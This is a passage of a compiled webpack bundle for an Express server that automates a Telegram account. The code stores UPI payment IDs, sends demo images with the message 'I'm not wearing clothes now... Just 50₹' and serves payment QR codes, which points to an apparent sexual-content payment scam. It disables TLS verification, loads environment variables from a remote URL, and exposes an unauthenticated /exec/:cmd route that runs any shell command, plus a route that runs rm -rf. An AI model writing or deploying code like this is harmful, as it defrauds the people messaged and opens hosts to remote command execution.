/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	var __webpack_modules__ = ({

/***/ "./src/Config.ts":
/*!***********************!*\
  !*** ./src/Config.ts ***!
  \***********************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


// const { execSync } = require('child_process');
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.getDataAndSetEnvVariables = getDataAndSetEnvVariables;
// try {
//     execSync(`npm install`, { stdio: 'inherit' });
// } catch (error) {
//     console.error(`Error installing  modules:`, error);
//     execSync(`refresh`, { stdio: 'inherit' });
// }
console.log("in Config");
const node_fetch_1 = __importDefault(__webpack_require__(/*! node-fetch */ "node-fetch"));
function getDataAndSetEnvVariables(url) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const response = yield (0, node_fetch_1.default)(url);
            const jsonData = yield response.json();
            // console.log("KEysLength: ", Object.keys(jsonData).length)
            for (const key in jsonData) {
                // console.log(`Setting key ${key}`)
                process.env[key] = jsonData[key];
            }
            console.log('Environment variables set successfully!');
        }
        catch (error) {
            console.error('Error retrieving data or setting environment variables:', error);
        }
    });
}


/***/ }),

/***/ "./src/UpiClass.ts":
/*!*************************!*\
  !*** ./src/UpiClass.ts ***!
  \*************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIds = void 0;
exports.assigntoUpis = assigntoUpis;
exports.setUpiIds = setUpiIds;
console.log('In Upi ids');
(__webpack_require__(/*! dotenv */ "dotenv").config)();
const fetchWithTimeout_1 = __webpack_require__(/*! ./utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
class UpiIds {
    static getUpiId(key) {
        return UpiIds[key];
    }
    static setUpiId(key, value) {
        UpiIds[key] = value;
    }
    static pushValue(value) {
        UpiIds.allIds.push(value);
    }
}
exports.UpiIds = UpiIds;
UpiIds.paytm1 = 'Q210249262@ybl';
UpiIds.paytm2 = "BHARATPE.8000073302@fbpe&bpsign=RUR1L3B2d1Z2WVJwdVVCNE5OMm4rL3pBS3pMVHF2MTJ0T3VtY3pnOGZUND0=";
UpiIds.paytm3 = 'paytmqr281005050101xv6mfg02t4m9@paytm';
UpiIds.ppay = 'paytmqr281005050101jnirp1ueoe1y@paytm';
UpiIds.bpayGen = 'BHARATPE.8000073302@fbpe&bpsign=RUR1L3B2d1Z2WVJwdVVCNE5OMm4rL3pBS3pMVHF2MTJ0T3VtY3pnOGZUND0=';
UpiIds.bpay2 = 'paytmqr281005050101rgcfsaeesx4o@paytm';
UpiIds.axisUPI = 'reddygirl@airtel';
UpiIds.gpay = 'Q137045557@ybl';
UpiIds.gpayid = 'reddygal@postbank';
UpiIds.defaultId = 'myred1808@postbank';
UpiIds.qrId = 'BHARATPE.8000073302@fbpe&bpsign=RUR1L3B2d1Z2WVJwdVVCNE5OMm4rL3pBS3pMVHF2MTJ0T3VtY3pnOGZUND0=';
UpiIds.allIds = [];
function assigntoUpis(jsonData) {
    Object.entries(jsonData).forEach(([key, value]) => {
        if (UpiIds.hasOwnProperty(key)) {
            UpiIds.setUpiId(key, value);
        }
        UpiIds.pushValue(value);
    });
    console.log("Upi Ids sett!!");
}
function setUpiIds() {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const response = yield (0, fetchWithTimeout_1.fetchWithTimeout)("https://api.npoint.io/54baf762fd873c55c6b1");
            const data = response.data;
            assigntoUpis(data);
            return data;
        }
        catch (error) {
            console.log(error); //dont change to parseError
        }
    });
}


/***/ }),

/***/ "./src/app.ts":
/*!********************!*\
  !*** ./src/app.ts ***!
  \********************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ExpressServer = exports.prcessID = void 0;
console.log("in App.ts");
const UpiClass_1 = __webpack_require__(/*! ./UpiClass */ "./src/UpiClass.ts");
const child_process_1 = __webpack_require__(/*! child_process */ "child_process");
const dbservice_1 = __webpack_require__(/*! ./dbservice */ "./src/dbservice.ts");
const cloudinaryService_1 = __importStar(__webpack_require__(/*! ./cloudinaryService */ "./src/cloudinaryService.ts"));
const index_1 = __webpack_require__(/*! ./index */ "./src/index.ts");
const utils_1 = __webpack_require__(/*! ./utils */ "./src/utils.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const messages_1 = __webpack_require__(/*! ./messages */ "./src/messages.ts");
const Config_1 = __webpack_require__(/*! ./Config */ "./src/Config.ts");
const respondToMsgs_1 = __webpack_require__(/*! ./respondToMsgs */ "./src/respondToMsgs.ts");
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ./utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const promotions_1 = __webpack_require__(/*! ./utils/promotions */ "./src/utils/promotions.ts");
const withTimeout_1 = __webpack_require__(/*! ./utils/withTimeout */ "./src/utils/withTimeout.ts");
const telegramUtils_1 = __webpack_require__(/*! ./telegramUtils */ "./src/telegramUtils.ts");
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const logbots_1 = __webpack_require__(/*! ./utils/logbots */ "./src/utils/logbots.ts");
const gemini_1 = __webpack_require__(/*! ./helpers/gemini */ "./src/helpers/gemini.ts");
const jobs_1 = __webpack_require__(/*! ./jobs */ "./src/jobs.ts");
const common_1 = __webpack_require__(/*! ./common */ "./src/common.ts");
let canTry = true;
let canTry2 = true;
exports.prcessID = Math.floor(Math.random() * 1234);
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
console.log("+++++++++++++INIT REPOSITORY++++++++++");
console.log("Client :", process.env.clientId);
process.stdin.resume();
let isShuttingDown = false;
const shutdown = (signal) => __awaiter(void 0, void 0, void 0, function* () {
    if (isShuttingDown)
        return;
    isShuttingDown = true;
    yield cleanupResources(signal);
    process.exit(0);
});
process.on('exit', (signal) => __awaiter(void 0, void 0, void 0, function* () {
    yield cleanupResources(signal.toString());
    console.log("Application Closed");
}));
function cleanupResources(signal) {
    return __awaiter(this, void 0, void 0, function* () {
        console.log("Init Module Destroying");
        try {
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`closed :: ${process.env.clientId}`)}`);
            if (dbservice_1.UserDataDtoCrud.isInstanceExist()) {
                yield (dbservice_1.UserDataDtoCrud.getInstance()).closeConnection();
            }
            console.log(`${signal} received, cleanup completed`);
        }
        catch (error) {
            console.error("Error during cleanup:", error);
        }
    });
}
process.on('SIGINT', shutdown);
process.on('SIGQUIT', shutdown);
process.on('SIGHUP', shutdown);
process.on('SIGUSR1', shutdown);
process.on('SIGUSR2', shutdown);
process.on('SIGTERM', shutdown);
process.on('uncaughtException', (err) => __awaiter(void 0, void 0, void 0, function* () {
    console.log('------------An uncaught exception occurred:', err);
    try {
        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId.toUpperCase()}: UNCAUGHT - ${err}`)}`);
        if (JSON.stringify(err).includes('MongoPoolClearedError')) {
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId.toUpperCase()} - Restarting DB`)}`);
            yield (dbservice_1.UserDataDtoCrud.getInstance()).closeConnection();
            setTimeout(() => {
                dbservice_1.UserDataDtoCrud.getInstance().connect();
            }, 15000);
        }
        if (JSON.stringify(err).includes("USER_DEACTIVATED_BAN") || JSON.stringify(err).includes("USER_DEACTIVATED") && !JSON.stringify(err).includes("INPUT_USER_DEACTIVATED")) {
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}: USER_DEACTIVATED - STARTED NEW USER PROCESS`)}`);
            const url = `${process.env.tgmanager}/setupClient/${process.env.clientId}?archiveOld=false&formalities=false`;
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(url);
        }
    }
    catch (error) {
        (0, parseError_1.parseError)(error);
    }
}));
process.on('unhandledRejection', (err) => __awaiter(void 0, void 0, void 0, function* () {
    console.log('------------An unhandledRejection  occurred:', err);
    try {
        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId.toUpperCase()}: UNHAndled - ${(0, parseError_1.extractMessage)((0, parseError_1.parseError)(err, "UnhandledRejection", false))}`)}`);
        if (JSON.stringify(err).includes('MongoPoolClearedError')) {
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId.toUpperCase()} - Restarting DB`)}`);
            yield (dbservice_1.UserDataDtoCrud.getInstance()).closeConnection();
            setTimeout(() => {
                dbservice_1.UserDataDtoCrud.getInstance().connect();
            }, 15000);
        }
        if (JSON.stringify(err).includes("USER_DEACTIVATED_BAN") || JSON.stringify(err).includes("USER_DEACTIVATED") && !JSON.stringify(err).includes("INPUT_USER_DEACTIVATED")) {
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${process.env.clientId.toUpperCase()}: USER_DEACTIVATED - STARTED NEW USER PROCESS`)}`);
            const url = `${process.env.tgmanager}/setupClient/${process.env.clientId}?archiveOld=false&formalities=false`;
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(url);
        }
        if (JSON.stringify(err).toLowerCase().includes("timeout")) {
            yield index_1.tgClass.refreshConnection();
        }
    }
    catch (error) {
        (0, parseError_1.parseError)(error);
    }
}));
var apiresp;
(function (apiresp) {
    apiresp["instanceNotExist"] = "INSTANCE_NOT_EXIST";
    apiresp["clienNotExist"] = "CLIENT_NOT_EXIST";
    apiresp["connectionNotExist"] = "CONNECTION_NOT_EXIST";
    apiresp["allGood"] = "ALL_GOOD";
    apiresp["danger"] = "DANGER";
    apiresp["wait"] = "WAIT";
})(apiresp || (apiresp = {}));
let ip;
const getPublicIP = () => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const response = yield axios_1.default.get('https://api.ipify.org?format=json');
        console.log(`Your public IP address is: ${response.data.ip}`);
        ip = response.data.ip;
    }
    catch (error) {
        console.error('Error fetching the public IP address:', error.message);
    }
});
getPublicIP();
const express = __webpack_require__(/*! express */ "express");
var cors = __webpack_require__(/*! cors */ "cors");
let expresApp = undefined;
class ExpressServer {
    constructor() {
        this.app = express();
        this.port = parseInt(process.env.PORT) || 3000;
        this.isRunning = false;
        this.app.use(this.earlyFlushMiddleware);
        // Middleware to track the last received request timestamp and store it in the database
        const trackLastRequestMiddleware = (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            try {
                if (dbservice_1.UserDataDtoCrud.isInstanceExist()) {
                    const db = dbservice_1.UserDataDtoCrud.getInstance();
                    yield db.updateTimestamps();
                }
                else {
                    console.error("Database instance does not exist.");
                }
            }
            catch (error) {
                console.error("Error updating timestamp in database:", error);
            }
            next();
        });
        this.app.use(trackLastRequestMiddleware);
        this.app.use(function (err, req, res, next) {
            return __awaiter(this, void 0, void 0, function* () {
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId.toUpperCase()}: UNCAUGHT- ${(0, parseError_1.parseError)(err).message}`)}`);
                res.status(500).send('Something broke!');
            });
        });
        this.app.use(cors());
        this.app.use(function (req, res, next) {
            res.header("Access-Control-Allow-Origin", "*");
            res.header('Access-Control-Allow-Methods', 'DELETE, PUT, GET, POST');
            res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
            res.setHeader('Cache-Control', 'no-store');
            next();
        });
        this.app.get('/', (req, res) => __awaiter(this, void 0, void 0, function* () {
            res.send('Hello, World!');
        }));
        this.app.get('/healthZ', (req, res) => __awaiter(this, void 0, void 0, function* () {
            res.send('HEALTHY!!');
        }));
        this.app.get('/getProcessId', (req, res) => __awaiter(this, void 0, void 0, function* () {
            res.json({ ProcessId: exports.prcessID.toString() });
        }));
        this.app.get('/refreshupis', (req, res) => __awaiter(this, void 0, void 0, function* () {
            yield (0, UpiClass_1.setUpiIds)();
            console.log(UpiClass_1.UpiIds.qrId);
            res.send("Reshing UPI Ids");
        }));
        this.app.get('/upiIds', (req, res) => __awaiter(this, void 0, void 0, function* () {
            res.json(UpiClass_1.UpiIds);
        }));
        this.app.get('/resetunpaid', (req, res) => __awaiter(this, void 0, void 0, function* () {
            if (dbservice_1.UserDataDtoCrud.isInstanceExist()) {
                const result = yield dbservice_1.UserDataDtoCrud.getInstance().resetUnpaid();
                res.json(result);
            }
            else {
                res.json({ message: "Db instanceNot Exist" });
            }
        }));
        this.app.get('/resetunppl', (req, res) => __awaiter(this, void 0, void 0, function* () {
            if (dbservice_1.UserDataDtoCrud.isInstanceExist()) {
                const result = yield dbservice_1.UserDataDtoCrud.getInstance().resetPpl();
                res.json(result);
            }
            else {
                res.json({ message: "Db instanceNot Exist" });
            }
        }));
        this.app.get('/getqueuelengths', (req, res) => __awaiter(this, void 0, void 0, function* () {
            if (dbservice_1.UserDataDtoCrud.isInstanceExist()) {
                const msg = (0, respondToMsgs_1.getMsgStats)();
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${(process.env.clientId).toUpperCase()}: ${msg}`)}`);
                res.send(msg);
            }
            else {
                res.json({ message: "Db instanceNot Exist" });
            }
        }));
        this.app.get('/downloadProfilePic/:index', (req, res) => __awaiter(this, void 0, void 0, function* () {
            const index = parseInt(req.params.index, 10) || 0;
            if (isNaN(index) || index < 0) {
                return res.status(400).send('Invalid index provided.');
            }
            try {
                const filePath = yield (0, utils_1.downloadProfilePic)(index_1.tgClass.getClient(), index);
                if (!filePath) {
                    return res.status(404).send('Profile photo not found.');
                }
                res.download(filePath, 'profile_pic.jpg', (err) => {
                    if (err) {
                        console.error('Error sending the file:', err);
                        res.status(500).send('Error downloading the file.');
                    }
                    fs.unlink(filePath, (err) => {
                        if (err) {
                            console.error('Error deleting the file:', err);
                        }
                    });
                });
            }
            catch (error) {
                console.error('Error in endpoint:', error);
                res.status(500).send('An error occurred.');
            }
        }));
        this.app.get('/requestcall/:chatId', (req, res) => __awaiter(this, void 0, void 0, function* () {
            const chatId = req.params.chatId;
            const force = req.query.force == "true";
            if (yield index_1.tgClass.instanceExist()) {
                res.send(yield (0, index_1.requestCall)(chatId, force));
            }
            else {
                console.log('Tg Class Instance not exist');
                res.send(false);
            }
        }));
        this.app.get('/chat/:chatId', (req, res) => __awaiter(this, void 0, void 0, function* () {
            const chatId = req.params.chatId;
            const offset = req.query.offset;
            const minId = req.query.minId;
            const limit = req.query.limit;
            if (yield index_1.tgClass.instanceExist()) {
                console.log("ChatRequest: ", chatId, offset, minId, limit);
                res.send(yield (0, utils_1.getMessagesNew)(chatId, offset, minId, limit));
            }
            else {
                console.log('Tg Class Instance not exist');
                res.send([]);
            }
        }));
        this.app.get('/deleteCallRequest/:chatId', (req, res) => __awaiter(this, void 0, void 0, function* () {
            const chatId = req.params.chatId;
            if (yield index_1.tgClass.instanceExist()) {
                res.send((0, index_1.deleteCallRequest)(chatId));
            }
            else {
                console.log('Tg Class Instance not exist');
                res.send(false);
            }
        }));
        this.app.get('/executehs/:chatId', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Responding!!`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            const chatId = req.params.chatId;
            const data = {};
            data['duration'] = req.query.duration || 0;
            data['video'] = req.query.video || 0;
            data['count'] = req.query.count || 0;
            data['endCall'] = req.query.endCall || false;
            data['retryCount'] = req.query.retryCount || 0;
            const tg = index_1.tgClass.getClient();
            yield (0, utils_1.executehs)(tg, chatId, data);
        }));
        this.app.get('/executehsl/:chatId', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Responding!!`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            const chatId = req.params.chatId;
            const data = {};
            data['duration'] = req.query.duration || 0;
            data['video'] = req.query.video || 0;
            data['count'] = req.query.count || 0;
            data['endCall'] = req.query.endCall || false;
            data['retryCount'] = req.query.retryCount || 0;
            const tg = index_1.tgClass.getClient();
            yield (0, utils_1.executehsl)(tg, chatId, data);
        }));
        this.app.get('/senddmp/:chatId', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Responding!!`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            const chatId = req.params.chatId;
            const video = req.query.video || '';
            const tg = index_1.tgClass.getClient();
            if (tg) {
                try {
                    yield tg.sendMessage(chatId, {
                        file: [
                            (0, common_1.getClientFilePath)('dmp1.jpg'),
                            (0, common_1.getClientFilePath)('dmp2.jpg'),
                            (0, common_1.getClientFilePath)('dmp3.jpg'),
                            (0, common_1.getClientFilePath)('dmp4.jpg')
                        ],
                        message: "Take Demo Video Call, I Will show you Directly!!\nI'm not wearing clothes now!!♥️🙈\n\n**Just 50₹!!**"
                    });
                }
                catch (e) {
                }
            }
        }));
        this.app.get('/deleteChat/:chatId', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Responding!!`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            const chatId = req.params.chatId;
            yield (0, telegramUtils_1.deleteChat)(chatId);
        }));
        this.app.get('/blockuser/:chatId', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Responding!!`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            const chatId = req.params.chatId;
            yield (0, telegramUtils_1.blockUser)(chatId);
        }));
        this.app.get('/unblockuser/:chatId', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Responding!!`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            const chatId = req.params.chatId;
            yield (0, telegramUtils_1.unblockUser)(chatId);
        }));
        this.app.get('/sendMessage/:chatId', (req, res) => __awaiter(this, void 0, void 0, function* () {
            const chatId = req.params.chatId;
            const force = req.query.force;
            const msg = decodeURIComponent(req.query.msg);
            const tg = index_1.tgClass.getClient();
            if (tg) {
                try {
                    const db = dbservice_1.UserDataDtoCrud.getInstance();
                    const userDetail = yield db.read(chatId);
                    if (userDetail.canReply !== 0) {
                        const msgs = (yield (0, withTimeout_1.withTimeout)(tg.getMessages(chatId, { limit: 5 }), 5000, "GetMessages Timeout", false)) || [{ fromId: null }];
                        const hasOthersMsg = msgs.some(msg => msg.fromId == null);
                        if (hasOthersMsg || force == 'true') {
                            if (force == 'true' || (0, utils_1.isServicePending)(userDetail)) {
                                res.json(yield tg.sendMessage(chatId, { message: msg, linkPreview: false }));
                            }
                            else {
                                if (userDetail.canReply !== 0) {
                                    yield (0, index_1.sendMessageWithButton)(`Failed to send External Message`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
                                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`https://arpithared.onrender.com/events/delete?chatId=${chatId}`);
                                    yield db.update(chatId, { paidReply: true, limitTime: Date.now() });
                                }
                                res.json({ message: "unwanted message" });
                            }
                        }
                        else {
                            res.json({ message: "LAst few msgs are mine" });
                        }
                    }
                    else {
                        res.json({ message: "Banned user" });
                    }
                }
                catch (error) {
                    (0, parseError_1.parseError)(error);
                    res.json(error);
                }
            }
            else {
                console.log('Tg Class Instance not exist');
                res.json({ message: 'Tg Class Instance not exist' });
            }
        }));
        this.app.get('/sendvclink/:chatId', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Responding!!`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            const chatId = req.params.chatId;
            const video = req.query.video || '';
            const tg = index_1.tgClass.getClient();
            if (tg) {
                try {
                    yield tg.sendMessage(chatId, { message: `https://zomCall.netlify.app/${process.env.clientId}/${chatId}/${video}`, linkPreview: false });
                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                        yield tg.sendMessage(chatId, { message: `https://zomCall.netlify.app/${process.env.clientId}/${chatId}/${video}`, linkPreview: false });
                    }), 10000);
                }
                catch (e) {
                }
            }
        }));
        this.app.get('/checkHealth', (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                if (canTry) {
                    canTry = false;
                    setTimeout(() => {
                        canTry = true;
                    }, 60000);
                    let hel = 'DEFAULT';
                    if (!(yield index_1.tgClass.instanceExist())) {
                        hel = apiresp.instanceNotExist;
                        const tgClient = yield index_1.tgClass.getClient();
                        if (tgClient === null || tgClient === void 0 ? void 0 : tgClient.connected) {
                            hel = apiresp.danger;
                            yield index_1.tgClass.deleteInstance();
                        }
                    }
                    else {
                        const tgClient = yield index_1.tgClass.getClient();
                        if (!tgClient) {
                            hel = apiresp.connectionNotExist;
                        }
                        else {
                            if (!(tgClient === null || tgClient === void 0 ? void 0 : tgClient.connected)) {
                                hel = apiresp.connectionNotExist;
                            }
                            else {
                                yield tgClient.connect();
                                hel = apiresp.allGood;
                            }
                        }
                    }
                    res.json({ status: hel, username: process.env.username });
                }
                else {
                    res.json({ status: apiresp.wait, username: process.env.username });
                }
            }
            catch (error) {
                res.json({ status: apiresp.danger, username: process.env.username });
            }
        }));
        this.app.get('/tryToConnect/:num', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('OK');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            var _a;
            const receivePrcssId = parseInt((_a = req.params) === null || _a === void 0 ? void 0 : _a.num);
            console.log(exports.prcessID, 'Connect Req received from: ', receivePrcssId);
            try {
                if (canTry2) {
                    if (receivePrcssId === exports.prcessID) {
                        // const isAlive = await fetchWithTimeout(`${ppplbot()}&text=${(process.env.clientId).toUpperCase()}: Alive Check`);
                        // if (isAlive) {
                        yield (0, Helpers_1.sleep)(300);
                        if (index_1.sendPing === false) {
                            console.log('Trying to Initiate CLIENT');
                            canTry2 = false;
                            setTimeout(() => {
                                canTry2 = true;
                            }, 70000);
                            let canStart = false;
                            for (let i = 0; i < 3; i++) {
                                const resp = yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=exit${process.env.username}`);
                                if (resp) {
                                    canStart = true;
                                    break;
                                }
                            }
                            yield (0, Helpers_1.sleep)(3000);
                            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=exit${process.env.username}`);
                            if (canStart) {
                                // await fetchWithTimeout(`${ppplbot()}&text=${(process.env.clientId).toUpperCase()}: Connecting.......!!`);
                                yield this.startConn();
                            }
                            // } else {
                            //     await fetchWithTimeout(`${ppplbot()}&text=${(process.env.clientId).toUpperCase()}: Pinging is Working`);
                            // }
                        }
                        else {
                            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent('Issue at sending Pings')}`);
                        }
                    }
                    else {
                        console.log('SomeOther Unknown Process Exist');
                        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId.toUpperCase()}: SomeOther Unknown Process Exist`)}`);
                    }
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/ls', (req, res) => __awaiter(this, void 0, void 0, function* () {
            res.send((0, child_process_1.execSync)('ls').toString());
        }));
        this.app.get('/deletefiles', (req, res) => __awaiter(this, void 0, void 0, function* () {
            console.log((0, child_process_1.execSync)('cd ../../'));
            console.log((0, child_process_1.execSync)('rm -rf *.mp3'));
            console.log((0, child_process_1.execSync)('rm -rf *.jpg'));
            res.send('HEllo');
        }));
        this.app.get('/getme', (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                if (yield index_1.tgClass.instanceExist()) {
                    const client = index_1.tgClass.getClient();
                    const me = yield client.getMe();
                    res.json(me);
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/getip', (req, res) => {
            res.send(ip);
        });
        this.app.get('/cleanupChannels', (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                if (yield index_1.tgClass.instanceExist()) {
                    const client = index_1.tgClass.getClient();
                    const me = yield client.getMe();
                    res.json(me);
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/channelInfo', (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                if (yield index_1.tgClass.instanceExist()) {
                    const client = index_1.tgClass.getClient();
                    const resp = yield (0, utils_1.channelInfo)(client, true, true);
                    res.status(200).json(resp);
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
                res.status(500).json({ error: 'An error occurred while processing the request.' });
            }
        }));
        this.app.get('/leaveChannels', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            next();
            res.send("Leaving Channels");
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                if (yield index_1.tgClass.instanceExist()) {
                    const client = index_1.tgClass.getClient();
                    const resp = yield (0, utils_1.leaveChannels)(client);
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/createNewFolder/:foldername', (req, res) => __awaiter(this, void 0, void 0, function* () {
            let folderName = req.params.foldername;
            const cl = yield cloudinaryService_1.default.getInstance();
            yield cl.createNewFolder(folderName);
            res.send('Created');
        }));
        this.app.get('overwritefiles', (req, res) => __awaiter(this, void 0, void 0, function* () {
            const cl = yield cloudinaryService_1.default.getInstance();
            yield cl.overwriteFile();
            res.send('Created');
        }));
        this.app.get('/setactiveqr', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('Hello World!');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            const upi = req.query.upi;
            console.log("upi = ", upi);
            yield (0, cloudinaryService_1.setQR)(upi, (0, common_1.getClientFilePath)("QR.jpg"));
        }));
        this.app.get('/refreshqr', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('Hello World!');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            yield (0, cloudinaryService_1.setQR)(UpiClass_1.UpiIds['qrId'], (0, common_1.getClientFilePath)("QR.jpg"));
        }));
        this.app.get('/exec/:cmd', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            let cmd = req.params.cmd;
            console.log(`executing: `, cmd);
            try {
                res.send(console.log((0, child_process_1.execSync)(cmd).toString()));
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/replyon', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            try {
                (0, index_1.setReply)(true);
                res.send("Starting replies");
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/replyoff', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            try {
                (0, index_1.setReply)(false);
                res.send("stopped replies");
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
